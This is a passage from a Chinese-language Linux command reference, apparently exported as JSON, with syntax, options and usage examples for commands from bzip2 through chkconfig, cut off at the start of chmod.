表明压缩文件损坏，出现导致 bzip2 紧急退出的内部一致性错误（例如缺陷）时返回 3。\n\n###  语法\n\n```shell\nbzip2 [ -cdfkqstvzVL123456789 ] [ filenames ...  ]\n```\n\n###  选项\n\n```shell\n-c --stdout\n    # 将数据压缩或解压缩至标准输出。\n\n-d --decompress\n    # 强制解压缩。 bzip2, bunzip2 以及 bzcat 实际上是同一个程序，进行何种操作将根据程序名确定。  指定该选项后将不考虑这一机制，强制 bzip2 进行解压缩。\n\n-z --compress\n    # -d 选项的补充：强制进行压缩操作，而不管执行的是哪个程序。\n\n-t --test\n    # 检查指定文件的完整性，但并不对其解压缩。 实际上将对数据进行实验性的解压缩操作，而不输出结果。\n\n-f --force\n    # 强制覆盖输出文件。通常 bzip2 不会覆盖已经存在的文件。该选项还强制 bzip2 打破文件的硬连接，缺省情况下 bzip2 不会这么做。\n\n-k --keep\n    # 在压缩或解压缩时保留输入文件（不删除这些文件）。\n\n-s --small\n    # 在压缩、解压缩及检查时减少内存用量。采用一种修正的算法进行压缩和测试，每个数据块仅需要 2.5 个字节。这意味着任何文件都可以在 2300k\n    # 的内存中进行解压缩， 尽管速度只有通常情况下的一半。\n\n    # 在压缩时，-s将选定 200k 的块长度，内存用量也限制在 200k 左右， 代价是压缩率会降低。 总之，如果机器的内存较少（8兆字节或更少），\n    # 可对所有操作都采用-s选项。参见下面的内存管理。\n\n-q --quiet\n    # 压制不重要的警告信息。属于 I/O 错误及其它严重事件的信息将不会被压制。\n\n-v --verbose\n    # 详尽模式 -- 显示每个被处理文件的压缩率。 命令行中更多的 -v 选项将增加详细的程度， 使 bzip2 显示出许多主要用于诊断目的信息。\n\n-L --license -V --version\n    # 显示软件版本，许可证条款及条件。\n\n-1 to -9\n    # 在压缩时将块长度设为 100 k、200 k ..  900 k。 对解压缩没有影响。参见下面的内存管理。\n\n-- # 将所有后面的命令行变量看作文件名，即使这些变量以减号\"-\"打头。 可用这一选项处理以减号\"-\"打头的文件名， 例如：bzip2 -- -myfilename.\n\n--repetitive-fast --repetitive-best\n    # 这些选项在 0.9.5 及其以上版本中是多余的。 在较早的版本中，这两个选项对排序算法的行为提供了一些粗糙的控制，有些情况下很有用。 0.9.5\n    # 及其以上版本采用了改进的算法而与这些选项无关。\n```\n\n###  参数\n\n文件：指定要压缩的文件。\n\n###  实例\n\n**压缩指定文件filename:** \n\n```shell\nbzip2 filename\n或\nbzip2 -z filename\n```\n\n这里，压缩的时候不会输出，会将原来的文件filename给删除，替换成filename.bz2.如果以前有filename.bz2则不会替换并提示错误（如果想要替换则指定-f选项，例如`bzip2 -f filename`；如果filename是目录则也提醒错误不做任何操作；如果filename已经是压过的了有bz2后缀就提醒一下，不再压缩，没有bz2后缀会再次压缩。\n\n**解压指定的文件filename.bz2:** \n\n```shell\nbzip2 -d filename.bz2\n或\nbunzip2 filename.bz2\n```\n\n这里，解压的时候没标准输出，会将原来的文件filename.bz2给替换成filename。如果以前有filename则不会替换并提示错误（如果想要替换则指定`-f`选项，例如`bzip2 -df filename.bz2`。\n\n**压缩解压的时候将结果也输出：** \n\n```shell\n$bzip2 -v filename\n```\n\n输入之后，输出如下：\n\n```shell\nfilename:  0.119:1, 67.200 bits/byte, -740.00% saved, 5 in, 42 out.\n```\n\n这里，加上`-v`选项就会输出了,只用压缩举例了，解压的时候同理`bzip2 -dv filename.bz2`不再举例了。\n\n**模拟解压实际并不解压：** \n\n```shell\nbzip2 -tv filename.bz2\n```\n\n输入之后，输出如下：\n\n```shell\nfilename.bz2: ok\n```\n\n这里，`-t`指定要进行模拟解压，不实际生成结果，也就是说类似检查文件,当然就算目录下面有filename也不会有什么错误输出了，因为它根本不会真的解压文件。为了在屏幕上输出，这里加上`-v`选项了,如果是真的解压`bzip2 -dv filename.bz2`则输出的是把\"ok\"替换成了\"done\"。\n\n**压缩解压的时候，除了生成结果文件，将原来的文件也保存:** \n\n```shell\nbzip2 -k filename\n```\n\n这里，加上`-k`就保存原始的文件了，否则原始文件会被结果文件替代。只用压缩举例了，解压的时候同理`$bzip2 -dk filename.bz2`不再举例了。\n\n**解压到标准输出：** \n\n```shell\nbzip2 -dc filename.bz2\n```\n\n输入之后，输出如下：\n\n```shell\nhahahhaahahha\n```\n\n这里，使用`-c`指定到标准输出，输出的是文件filename的内容，不会将filename.bz2删除。\n\n**压缩到标准输出：** \n\n```shell\nbzip2 -c filename\nbzip2: I won't write compressed data to a terminal.\nbzip2: For help, type: `bzip2 --help'.\n```\n\n这里，使用`-c`指定压缩到标准输出不删除原有文件，不同的是，压缩后的文件无法输出到标准输出。\n\n**使用bzip2的时候将所有后面的看作文件(即使文件名以'-'开头)：** \n\n```shell\nbzip2 -- -myfilename\n```\n\n这里主要是为了防止文件名中`-`产生以为是选项的歧义。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bzip2"]},{"title":"【Linux 命令】bzip2recover","url":"/linux-command/bzip2recover/","content":"\n恢复被破坏的.bz2压缩包中的文件\n\n## 补充说明\n\n**bzip2recover命令** 可用于恢复被破坏的“.bz2”压缩包中的文件。\n\nbzip2是以区块的方式来压缩文件，每个区块视为独立的单位。因此，当某一区块损坏时，便可利用bzip2recover，试着将文件中的区块隔开来，以便解压缩正常的区块。通常只适用在压缩文件很大的情况。\n\n###  语法\n\n```shell\nbzip2recover(参数)\n```\n\n###  参数\n\n文件：指定要恢复数据的.bz2压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bzip2recover"]},{"title":"【Linux 命令】bzless","url":"/linux-command/bzless/","content":"\n增强.bz2压缩包查看器\n\n## 补充说明\n\n**bzless命令** 是增强“.bz2”压缩包查看器，bzless比bzmore命令功能更加强大。\n\n###  语法\n\n```shell\nbzless(参数)\n```\n\n###  参数\n\n文件：指定要分屏显示的.bz2压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bzless"]},{"title":"【Linux 命令】bzmore","url":"/linux-command/bzmore/","content":"\n查看bzip2压缩过的文本文件的内容\n\n## 补充说明\n\n**bzmore命令** 用于查看bzip2压缩过的文本文件的内容，当下一屏显示不下时可以实现分屏显示。\n\n###  语法\n\n```shell\nbzmore(参数)\n```\n\n###  参数\n\n文件：指定要分屏显示的.bz2压缩包。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","bzmore"]},{"title":"【Linux 命令】cal","url":"/linux-command/cal/","content":"\n显示当前日历或指定日期的日历\n\n## 补充说明\n\n**cal命令** 用于显示当前日历，或者指定日期的日历，如果没有指定参数，则显示当前月份。\n\n一个单一的参数指定要显示的年份  (1  -  9999)  ;  注意年份必须被完全地指定:  cal 89 不会 显示1989年的日历.  两个参数表示月份 (1 - 12) 和年份.  如果没有指定参数,\n则显示当前月份的日历.\n\n一年从Jan 1 (1 月 1 日) 开始.\n\n格里高利历法改革(Gregorian Reformation)被认为发生于 1752 年 9 月 3 日.  在此之前, 多数国家已经认可这项改革(尽管有一些直到 20  世纪初才认可它).   那天之后的  10\n天在这项改革被略去了, 所以那个月的日历有点不太寻常.\n\n###  语法\n\n```shell\ncal [ -mjy ] [ 月份 ] [ 年份 ]\n```\n\n###  选项\n\n```shell\n-l # 显示单月输出；\n-3 # 显示临近三个月的日历；\n-s # 将星期日作为月的第一天；\n-m # 显示星期一作为一周的第一天..  (缺省为星期日.)\n-j # 显示儒略历的(Julian)日期 (以 1 为基的天数, 从 1 月 1 日开始计数) .\n-y # 显示当前年份的日历..\n```\n\n###  参数\n\n```shell\n月：指定月份；\n年：指定年份。\n```\n\n###  实例\n\n单独执行cal命令会打印出日历：\n\n```shell\n[root@localhost ~]# cal\n    十二月 2013     \n日 一 二 三 四 五 六\n 1  2  3  4  5  6  7\n 8  9 10 11 12 13 14\n15 16 17 18 19 20 21\n22 23 24 25 26 27 28\n29 30 31\n```\n\n```shell\n[root@localhost ~]# cal -j\n        十二月 2013        \n  日   一   二   三   四   五   六\n335 336 337 338 339 340 341\n342 343 344 345 346 347 348\n349 350 351 352 353 354 355\n356 357 358 359 360 361 362\n363 364 365\n```\n\n```shell\n[root@localhost ~]# cal -3\n\n      九月 2021               十月 2021               十一月 2021\n日  一 二  三 四 五  六  日 一 二 三  四  五 六  日 一 二 三 四 五 六\n          1  2  3  4                  1  2      1  2  3  4  5  6\n 5  6  7  8  9 10 11   3  4  5  6  7  8  9   7  8  9 10 11 12 13\n12 13 14 15 16 17 18  10 11 12 13 14 15 16  14 15 16 17 18 19 20\n19 20 21 22 23 24 25  17 18 19 20 21 22 23  21 22 23 24 25 26 27\n26 27 28 29 30        24 25 26 27 28 29 30  28 29 30\n                      31\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cal"]},{"title":"【Linux 命令】cancel","url":"/linux-command/cancel/","content":"\n取消已存在的打印任务\n\n## 补充说明\n\n**cancel命令** 用于取消已存在的打印任务。\n\n###  语法\n\n```shell\ncancel(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：取消所有打印任务；\n-E：当连接到服务器时强制使用加密；\n-U：指定连接服务器时使用的用户名；\n-u：指定打印任务所属的用户；\n-h：指定连接的服务器名和端口号。\n```\n\n###  参数\n\n打印任务号：指定要取消的打印任务编号。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cancel"]},{"title":"【Linux 命令】cat","url":"/linux-command/cat/","content":"\n连接多个文件并打印到标准输出。\n\n## 概要\n\n```shell\ncat [OPTION]... [FILE]...\n```\n\n## 主要用途\n\n- 显示文件内容，如果没有文件或文件为`-`则读取标准输入。\n- 将多个文件的内容进行连接并打印到标准输出。\n- 显示文件内容中的不可见字符（控制字符、换行符、制表符等）。\n\n## 参数\n\nFILE（可选）：要处理的文件，可以为一或多个。\n\n## 选项 \n\n```shell\n长选项与短选项等价\n\n-A, --show-all           等价于\"-vET\"组合选项。\n-b, --number-nonblank    只对非空行编号，从1开始编号，覆盖\"-n\"选项。\n-e                       等价于\"-vE\"组合选项。\n-E, --show-ends          在每行的结尾显示'$'字符。\n-n, --number             对所有行编号，从1开始编号。\n-s, --squeeze-blank      压缩连续的空行到一行。\n-t                       等价于\"-vT\"组合选项。\n-T, --show-tabs          使用\"^I\"表示TAB（制表符）。\n-u                       POSIX兼容性选项，无意义。\n-v, --show-nonprinting   使用\"^\"和\"M-\"符号显示控制字符，除了LFD（line feed，即换行符'\\n'）和TAB（制表符）。\n\n--help                   显示帮助信息并退出。\n--version                显示版本信息并退出。\n```\n\n## 返回值\n\n返回状态为成功除非给出了非法选项或非法参数。\n\n## 例子 \n\n```shell\n# 合并显示多个文件\ncat ./1.log ./2.log ./3.log\n# 显示文件中的非打印字符、tab、换行符\ncat -A test.log\n# 压缩文件的空行\ncat -s test.log\n# 显示文件并在所有行开头附加行号\ncat -n test.log\n# 显示文件并在所有非空行开头附加行号\ncat -b test.log\n# 将标准输入的内容和文件内容一并显示\necho '######' |cat - test.log\n```\n\n### 注意\n\n1. 该命令是`GNU coreutils`包中的命令，相关的帮助信息请查看`man -s 1 cat`或`info coreutils 'cat invocation'`。\n2. 当使用`cat`命令查看**体积较大的文件**时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容，为了控制滚屏，可以按`Ctrl+s`键停止滚屏；按`Ctrl+q`键恢复滚屏；按`Ctrl+c`（中断）键可以终止该命令的执行，返回Shell提示符状态。\n3. 建议您查看**体积较大的文件**时使用`less`、`more`命令或`emacs`、`vi`等文本编辑器。\n\n### 参考链接\n\n1. [Question about LFD key](https://superuser.com/questions/328054/is-there-an-lfd-key-on-my-keyboard)\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cat"]},{"title":"【Linux 命令】cd","url":"/linux-command/cd/","content":"\n切换用户当前工作目录。\n\n## 概要\n\n```shell\ncd [-L|[-P [-e]]] [dir]\n```\n\n## 主要用途\n\n- 切换工作目录至`dir`。其中`dir`的表示法可以是绝对路径或相对路径。\n- 若参数`dir`省略，则默认为使用者的shell变量`HOME`。\n- 如果`dir`指定为`~`时表示为使用者的shell变量`HOME`，`.`表示当前目录，`..`表示当前目录的上一级目录。\n- 环境变量`CDPATH`是由冒号分割的一到多个目录，你可以将常去的目录的上一级加入到`CDPATH`以便方便访问它们；如果`dir`以`/`开头那么`CDPATH`不会被使用。\n- 当`shopt`选项`cdable_vars`打开时，如果`dir`在`CDPATH`及当前目录下均不存在，那么会把它当作变量，读取它的值作为要进入的目录。\n\n## 参数\n\ndir（可选）：指定要切换到的目录。\n\n## 选项\n\n```shell\n-L （默认值）如果要切换到的目标目录是一个符号连接，那么切换到符号连接的目录。\n-P 如果要切换到的目标目录是一个符号连接，那么切换到它指向的物理位置目录。\n-  当前工作目录将被切换到环境变量OLDPWD所表示的目录，也就是前一个工作目录。\n```\n\n## 返回值\n\n返回状态为成功除非无法进入指定的目录。\n\n## 例子\n\n```shell\ncd    # 进入用户主目录；\ncd /  # 进入根目录\ncd ~  # 进入用户主目录；\ncd ..  # 返回上级目录（若当前目录为“/“，则执行完后还在“/\"；\"..\"为上级目录的意思）；\ncd ../..  # 返回上两级目录；\ncd !$  # 把上个命令的参数作为cd参数使用。\n```\n\n关于切换到上一个工作目录的说明\n\n```shell\ncd -\n# 命令会首先显示要切换到的目标目录，然后再进入。\ncd ${OLDPWD}\n# 命令会直接切换到上一个工作目录。\n```\n\n关于`CDPATH`\n\n```shell\n# 设置桌面文件夹作为CDPATH的值。\nCDPATH='~/Desktop'\n# 假设我们接下来要演示涉及到的路径~和~/Desktop下没有test3文件夹，现在新建它们。\nmkdir ~/test3\nmkdir ~/Desktop/test3\n# 进入~目录。\ncd ~\n# 进入test3目录。\ncd test3\n# 执行后显示~/Desktop/test3并进入该目录，而不是~目录的test3目录。\n# 如果CDPATH存在值，那么优先在CDPATH中查找并进入第一个匹配成功的，如果全部失败那么最后尝试当前目录。\n```\n\n关于`cdable_vars`\n\n```shell\n# 打开选项。\nshopt -s cdable_vars\n# 假设当前路径以及CDPATH没有名为new_var的目录。\nnew_var='~/Desktop'\n# 尝试进入。\ncd new_var\n# 关闭选项。\nshopt -u cdable_vars\n```\n\n### 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n\n2. 建议您在编写脚本的过程中如有必要使用`cd`命令时，请增加必要的注释以用于提醒阅读者当前工作目录，以免出现诸如`找不到文件`这类问题的发生。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cd"]},{"title":"【Linux 命令】cdrecord","url":"/linux-command/cdrecord/","content":"\nLinux系统下光盘刻录功能命令\n\n## 补充说明\n\n**cdrecord命令** 用于Linux系统下光盘刻录，它支持cd和DVD格式。linux下一般都带有cdrecord软件。\n\n###  语法\n\n```shell\ncdrecord(选项)(参数)\n```\n\n###  选项\n\n```shell\n-v：显示刻录光盘的详细过程；\n-eject：刻录完成后弹出光盘；\nspeed=<刻录倍速>：指定光盘刻录的倍速；\ndev=<刻录机设备号>：指定使用“-scanbus”参数扫描到的刻录机的设备号；\n-scanbus：扫描系统中可用的刻录机。\n```\n\n###  参数\n\nISO文件：指定刻录光盘使用的ISO映像文件。\n\n###  实例\n\n查看系统所有 CD-R(w) 设备：\n\n```shell\ncdrecord -scanbus\nscsibus0:\n  0,0,0     0) *\n  0,1,0     1) *\n  0,2,0     2) *\n  0,3,0     3) 'HP      ' 'CD-Writer+ 9200 ' '1.0c' Removable CD-ROM\n```\n\n用iso文件刻录一张光盘：\n\n```shell\ncdrecord -v -eject speed=4 dev=0,3,0 backup.iso\n```\n\n参数解释\n\n* -v：显示刻录光盘的详细过程\n* -eject：刻完自动弹出光盘\n* speed=4 dev=0,3,0：四速刻录到HP CD-writer设备上。\n\n擦写光驱：\n\n```shell\ncdrecord --dev=0,3,0 --blank=fast\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","cdrecord"]},{"title":"【Linux 命令】chage","url":"/linux-command/chage/","content":"\n修改帐号和密码的有效期限\n\n## 补充说明\n\n**chage命令** 是用来修改帐号和密码的有效期限。\n\n###  语法\n\n```shell\nchage [选项] 用户名\n```\n\n###  选项\n\n```shell\n-m：密码可更改的最小天数。为零时代表任何时候都可以更改密码。\n-M：密码保持有效的最大天数。\n-w：用户密码到期前，提前收到警告信息的天数。\n-E：帐号到期的日期。过了这天，此帐号将不可用。\n-d：上一次更改的日期。\n-i：停滞时期。如果一个密码已过期这些天，那么此帐号将不可用。\n-l：例出当前的设置。由非特权用户来确定他们的密码或帐号何时过期。\n```\n\n###  实例\n\n可以编辑`/etc/login.defs`来设定几个参数，以后设置口令默认就按照参数设定为准：\n\n```shell\nPASS_MAX_DAYS   99999\nPASS_MIN_DAYS   0\nPASS_MIN_LEN    5\nPASS_WARN_AGE   7\n```\n\n当然在`/etc/default/useradd`可以找到如下2个参数进行设置：\n\n```shell\n# useradd defaults file\nGROUP=100\nHOME=/home\nINACTIVE=-1\nEXPIRE=\nSHELL=/bin/bash\nSKEL=/etc/skel\nCREATE_MAIL_SPOOL=yes\n```\n\n通过修改配置文件，能对之后新建用户起作用，而目前系统已经存在的用户，则直接用chage来配置。\n\n我的服务器root帐户密码策略信息如下：\n\n```shell\nchage -l root\n\n最近一次密码修改时间                  ： 3月 12, 2013\n密码过期时间                         ：从不\n密码失效时间                         ：从不\n帐户过期时间                         ：从不\n两次改变密码之间相距的最小天数          ：0\n两次改变密码之间相距的最大天数          ：99999\n在密码过期之前警告的天数               ：7\n```\n\n我可以通过如下命令修改我的密码过期时间：\n\n```shell\nchage -M 60 root\nchage -l root\n\n最近一次密码修改时间                  ： 3月 12, 2013\n密码过期时间                         ： 5月 11, 2013\n密码失效时间                         ：从不\n帐户过期时间                         ：从不\n两次改变密码之间相距的最小天数          ：0\n两次改变密码之间相距的最大天数          ：60\n在密码过期之前警告的天数               ：9\n```\n\n然后通过如下命令设置密码失效时间：\n\n```shell\nchage -I 5 root\nchage -l root\n\n最近一次密码修改时间                  ： 3月 12, 2013\n密码过期时间                         ： 5月 11, 2013\n密码失效时间                         ： 5月 16, 2013\n帐户过期时间                         ：从不\n两次改变密码之间相距的最小天数          ：0\n两次改变密码之间相距的最大天数          ：60\n在密码过期之前警告的天数               ：9\n```\n\n从上述命令可以看到，在密码过期后5天，密码自动失效，这个用户将无法登陆系统了。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chage"]},{"title":"【Linux 命令】chattr","url":"/linux-command/chattr/","content":"\n用来改变文件属性\n\n## 补充说明\n\n**chattr命令** 用来改变文件属性。这项指令可改变存放在ext2文件系统上的文件或目录属性，这些属性共有以下8种模式：\n\n###  语法\n\n```shell\nchattr(选项)\n```\n\n###  选项\n\n```shell\na：让文件或目录仅供附加用途；\nb：不更新文件或目录的最后存取时间；\nc：将文件或目录压缩后存放；\nd：将文件或目录排除在倾倒操作之外；\ni：不得任意更动文件或目录；\ns：保密性删除文件或目录；\nS：即时更新文件或目录；\nu：预防意外删除。\n```\n\n```shell\n-R：递归处理，将指令目录下的所有文件及子目录一并处理；\n-v<版本编号>：设置文件或目录版本；\n-V：显示指令执行过程；\n+<属性>：开启文件或目录的该项属性；\n-<属性>：关闭文件或目录的该项属性；\n=<属性>：指定文件或目录的该项属性。\n```\n\n###  实例\n\n用chattr命令防止系统中某个关键文件被修改：\n\n```shell\nchattr +i /etc/fstab\n```\n\n然后试一下rm、mv、rename等命令操作于该文件，都是得到Operation not permitted的结果。\n\n让某个文件只能往里面追加内容，不能删除，一些日志文件适用于这种操作：\n\n```shell\nchattr +a /data1/user_act.log\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chattr"]},{"title":"【Linux 命令】chcon","url":"/linux-command/chcon/","content":"\n修改对象（文件）的安全上下文\n\n## 补充说明\n\n**chcon命令** 是修改对象（文件）的安全上下文，比如：用户、角色、类型、安全级别。也就是将每个文件的安全环境变更至指定环境。使用`--reference`选项时，把指定文件的安全环境设置为与参考文件相同。chcon命令位于`/usr/bin/chcon`。\n\n### 语法\n\n```shell\nchcon [选项]... 环境 文件...\nchcon [选项]... [-u 用户] [-r 角色] [-l 范围] [-t 类型] 文件...\nchcon [选项]... --reference=参考文件 文件...\n```\n\n### 选项\n\n```shell\n-h, --no-dereference：影响符号连接而非引用的文件。\n    --reference=参考文件：使用指定参考文件的安全环境，而非指定值。\n-R, --recursive：递归处理所有的文件及子目录。\n-v, --verbose：为处理的所有文件显示诊断信息。\n-u, --user=用户：设置指定用户的目标安全环境。\n-r, --role=角色：设置指定角色的目标安全环境。\n-t, --type=类型：设置指定类型的目标安全环境。\n-l, --range=范围：设置指定范围的目标安全环境。\n```\n\n以下选项是在指定了`-R`选项时被用于设置如何穿越目录结构体系。如果您指定了多于一个选项，那么只有最后一个会生效。\n\n```shell\n-H：如果命令行参数是一个通到目录的符号链接，则遍历符号链接。\n-L：遍历每一个遇到的通到目录的符号链接。\n-P：不遍历任何符号链接（默认）。\n--help：显示此帮助信息并退出。\n--version：显示版本信息并退出。\n```\n\n### 实例\n\n如果你想把这个ftp共享给匿名用户的话，需要开启以下：\n\n```shell\nchcon -R -t public_content_t /var/ftp\n```\n\n如果你想让你设置的FTP目录可以上传文件的话，SELINUX需要设置：\n\n```shell\nchcon -t public_content_rw_t /var/ftp/incoming\n```\n\n允许用户HHTP访问其家目录，该设定限仅于用户的家目录主页：\n\n```shell\nsetsebool -P httpd_enable_homedirs 1\nchcon -R -t httpd_sys_content_t ~user/public_html\n```\n\n如果你希望将samba目录共享给其他用户，你需要设置：\n\n```shell\nchcon -t samba_share_t /directory\n```\n\n共享rsync目录时：\n\n```shell\nchcon -t public_content_t /directories\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chcon"]},{"title":"【Linux 命令】chfn","url":"/linux-command/chfn/","content":"\n用来改变finger命令显示的信息\n\n## 补充说明\n\n**chfn命令** 用来改变finger命令显示的信息。这些信息都存放在/etc目录里的passwd文件里。若不指定任何选项，则chfn命令会进入问答式界面。\n\n###  语法\n\n```shell\nchfn(选项)(参数)\n```\n\n###  选项\n\n```shell\n-f<真实姓名>或--full-name<真实姓名>：设置真实姓名；\n-h<家中电话>或--home-phone<家中电话>：设置家中的电话号码；\n-o<办公地址>或--office<办公地址>：设置办公室的地址；\n-p<办公电话>或--office-phone<办公电话>：设置办公室的电话号码；\n-u或--help：在线帮助；\n-v或-version：显示版本信息。\n```\n\n###  参数\n\n用户名：指定要改变finger信息的用户名。\n\n###  实例\n\n范例1，改变finger信息：\n\n```shell\n[root@localhost Desktop]# chfn\nChanging finger information for root.\nName [root]: jack\nOffice []: hn\nOffice Phone []: 888888\nHome Phone []: 9999999\n\nFinger information changed.\n```\n\n范例2，改变账号真实姓名：\n\n```shell\n[root@localhost Desktop]# chfn -f jack\nChanging finger information for root.\nFinger information changed.\n```\n\n范例3：\n\n```shell\nshell>> chfn\nChanging finger information for user\nPassword: [del]\nName[]:linuxde ### 提供 finger 时的资料\nOffice[]:NCCU\nOffice Phone[]: [del]\nHome Phone[]: [del]\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chfn"]},{"title":"【Linux 命令】chgrp","url":"/linux-command/chgrp/","content":"\n用来变更文件或目录的所属群组\n\n## 补充说明\n\n**chgrp命令** 用来改变文件或目录所属的用户组。该命令用来改变指定文件所属的用户组。其中，组名可以是用户组的id，也可以是用户组的组名。文件名可以 是由空格分开的要改变属组的文件列表，也可以是由通配符描述的文件集合。如果用户不是该文件的文件主或超级用户(root)，则不能改变该文件的组。\n\n在UNIX系统家族里，文件或目录权限的掌控以拥有者及所属群组来管理。您可以使用chgrp指令去变更文件与目录的所属群组，设置方式采用群组名称或群组识别码皆可。\n\n###  语法 \n\n```shell\nchgrp [选项][组群][文件|目录]\n```\n\n###  选项 \n\n```shell\n-R 递归式地改变指定目录及其下的所有子目录和文件的所属的组\n-c或——changes：效果类似“-v”参数，但仅回报更改的部分；\n-f或--quiet或——silent：不显示错误信息；\n-h或--no-dereference：只对符号连接的文件作修改，而不是该其他任何相关文件；\n-H如果命令行参数是一个通到目录的符号链接，则遍历符号链接\n-R或——recursive：递归处理，将指令目录下的所有文件及子目录一并处理；\n-L遍历每一个遇到的通到目录的符号链接\n-P不遍历任何符号链接（默认）\n-v或——verbose：显示指令执行过程；\n--reference=<参考文件或目录>：把指定文件或目录的所属群组全部设成和参考文件或目录的所属群组相同；\n```\n\n###  参数 \n\n*   组：指定新工作名称；\n*   文件：指定要改变所属组的文件列表。多个文件或者目录之间使用空格隔开。\n\n###  实例 \n\n将`/usr/meng`及其子目录下的所有文件的用户组改为mengxin\n\n```shell\nchgrp -R mengxin /usr/meng\n```\n\n更改文件ah的组群所有者为 `newuser`\n\n```shell\n[root@rhel ~]# chgrp newuser ah\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chgrp"]},{"title":"【Linux 命令】chkconfig","url":"/linux-command/chkconfig/","content":"\n检查或设置系统的各种服务\n\n## 补充说明\n\n**chkconfig命令** 检查、设置系统的各种服务。这是Red Hat公司遵循GPL规则所开发的程序，它可查询操作系统在每一个执行等级中会执行哪些系统服务，其中包括各类常驻服务。谨记chkconfig不是立即自动禁止或激活一个服务，它只是简单的改变了符号连接。\n\n###  语法 \n\n```shell\nchkconfig(选项)\n```\n\n###  选项 \n\n```shell\n--add：增加所指定的系统服务，让chkconfig指令得以管理它，并同时在系统启动的叙述文件内增加相关数据；\n--del：删除所指定的系统服务，不再由chkconfig指令管理，并同时在系统启动的叙述文件内删除相关数据；\n--level<等级代号>：指定读系统服务要在哪一个执行等级中开启或关毕。\n```\n缺省的运行级，RHS用到的级别如下：\n\n* 0：关机\n* 1：单用户模式\n* 2：无网络支持的多用户模式\n* 3：有网络支持的多用户模式\n* 4：保留，未使用\n* 5：有网络支持有X-Window支持的多用户模式\n* 6：重新引导系统，即重启\n\n对各个运行级的详细解释：\n\n* 0 为停机，机器关闭。\n* 1 为单用户模式，就像Win9x下的安全模式类似。\n* 2  为多用户模式，但是没有NFS支持。 \n* 3  为完整的多用户模式，是标准的运行级。\n* 4 一般不用，在一些特殊情况下可以用它来做一些事情。例如在笔记本 电脑的电池用尽时，可以切换到这个模式来做一些设置。\n* 5  就是X11，进到X Window系统了。\n* 6  为重启，运行init 6机器就会重启。\n\n需要说明的是，level选项可以指定要查看的运行级而不一定是当前运行级。对于每个运行级，只能有一个启动脚本或者停止脚本。当切换运行级时，init不会重新启动已经启动的服务，也不会再次去停止已经停止的服务。\n\n运行级文件：\n\n每个被chkconfig管理的服务需要在对应的init.d下的脚本加上两行或者更多行的注释。第一行告诉chkconfig缺省启动的运行级以及启动和停止的优先级。如果某服务缺省不在任何运行级启动，那么使用`-`代替运行级。第二行对服务进行描述，可以用`\\`跨行注释。\n\n例如random.init包含三行：\n\n```shell\n# chkconfig: 2345 20 80\n# description: Saves and restores system entropy pool for \\\n# higher quality random number generation.\n```\n\n###  实例 \n\n```shell\nchkconfig --list             #列出所有的系统服务。\nchkconfig --add httpd        #增加httpd服务。\nchkconfig --del httpd        #删除httpd服务。\nchkconfig --level httpd 2345 on        #设置httpd在运行级别为2、3、4、5的情况下都是on（开启）的状态。\nchkconfig --list               # 列出系统所有的服务启动情况。\nchkconfig --list mysqld        # 列出mysqld服务设置情况。\nchkconfig --level 35 mysqld on # 设定mysqld在等级3和5为开机运行服务，--level 35表示操作只在等级3和5执行，on表示启动，off表示关闭。\nchkconfig mysqld on            # 设定mysqld在各等级为on，“各等级”包括2、3、4、5等级。\n\nchkconfig –level redis 2345 on # 把redis在运行级别为2、3、4、5的情况下都是on（开启）的状态。\n```\n\n如何增加一个服务：\n\n1.  服务脚本必须存放在`/etc/ini.d/`目录下；\n2.  `chkconfig --add servicename`在chkconfig工具服务列表中增加此服务，此时服务会被在`/etc/rc.d/rcN.d`中赋予K/S入口了；\n3.  `chkconfig --level 35 mysqld on`修改服务的默认启动等级。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","chkconfig"]},{"title":"【Linux 命令】chmod","url":"/linux-command/chmod/","content":"\n用来变更文件或目录的权限\n\n## 概要\n\n```shell\nchmod [OPTION]... MODE[,MODE]... FILE...\nchmod [OPTION]... OCTAL-MODE FILE...\nchmod [OPTION]... --reference=RFILE FILE...\n```\n\n## 主要用途\n\n- 通过符号组合的方式更改目标文件或目录的权限。\n- 通过八进制数的方式更改目标文件或目录的权限。\n- 通过参考文件的权限来更改目标文件或目录的权限。\n\n## 参数\n\nmode：八进制数或符号组合。\n\nfile：指定要更改权限的一到多个文件。\n\n## 选项 \n\n```shell\n-c, --changes：当文件的权限更改时输出操作信息。\n--no-preserve-root：不将'/'特殊化处理，默认选项。\n--preserve-root：不能在根目录下递归操作。\n-f, --silent, --quiet：抑制多数错误消息的输出。\n-v, --verbose：无论文件是否更改了权限，一律输出操作信息。\n--reference=RFILE：使用参考文件或参考目录RFILE的权限来设置目标文件或目录的权限。\n-R, --recursive：对目录以及目录下的文件递归执行更改权限操作。\n--help：显示帮助信息并退出。\n--version：显示版本信息并退出。\n```\n\n## 返回值\n\n返回状态为成功除非给出了非法选项或非法参数。\n\n## 例子 \n\n> 参考`man chmod`文档的`DESCRIPTION`段落得知：\n> - `u`符号代表当前用户。\n> - `g`符号代表和当前用户在同一个组的用户，以下简称组用户。\n> - `o`符号代表其他用户。\n> - `a`符号代表所有用户。\n> - `r`符号代表读权限以及八进制数`4`。\n> - `w`符号代表写权限以及八进制数`2`。\n> - `x`符号代表执行权限以及八进制数`1`。\n> - 